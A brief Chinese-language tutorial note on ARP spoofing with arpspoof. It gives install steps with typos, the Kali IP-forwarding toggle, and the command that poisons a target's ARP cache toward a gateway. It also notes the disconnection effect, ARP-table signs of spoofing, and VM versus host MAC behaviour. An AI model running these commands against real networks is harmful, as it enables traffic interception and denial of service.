# arp欺骗(ipv4)-arpspoof
* ```
    ARP（Address Resolution Protocol）是一种用于将IP地址映射到物理MAC地址的协议。
    它在局域网中起到了重要的作用，使得网络设备可以通过IP地址找到对应的MAC地址，以便进行数据包的传输。
* [arp原理](./protocols/001-arp%E5%8E%9F%E7%90%86.md)
* arpspoof 欺骗就是发送`伪arp的响应包`，不断告诉受骗机 我就是目标主机，并传入自己的mac地址
* arp欺骗成功后，可以发动`中间人(MITM)攻击`,`断网攻击`,`dos(denial of service 拒绝服务)`

## arpspoof使用
* 安装
* ```
    # arpspoof只是dsniff中一个工具
    sudo apt-get update
    sudo apt-get upgrade、
    sudo apt-get intall dsniff
* ```
    # 在Kali Linux中，启用IP转发。
    echo 1 > /proc/sys/net/ipv4/ip_forward
    # 若设置为0 直接断网

* ```
    # 该命令会不断发送伪arp响应，告诉attack_ip我就是 gateway
    arpspoof -i eth0 -t attack_ip -r gateway
    # -i 表示对应网络接口，-t 要攻击的ip，-r 路由器ip(网关)
* ```
    # 特征
    # 受骗主机的arp 表将会两个相同mac的主机ip，
    # 一个是 gateway，一个是 kali，其中gateway的mac被篡改了

## 一些问题
### 使用kali虚拟机进行arp欺骗，对真机和对另外一台虚拟机的mac篡改是不同的
* 虚拟机被篡改的mac为kali的mac(虚拟网卡)
* 真机mac被篡改为kali所在主机的mac(真网卡)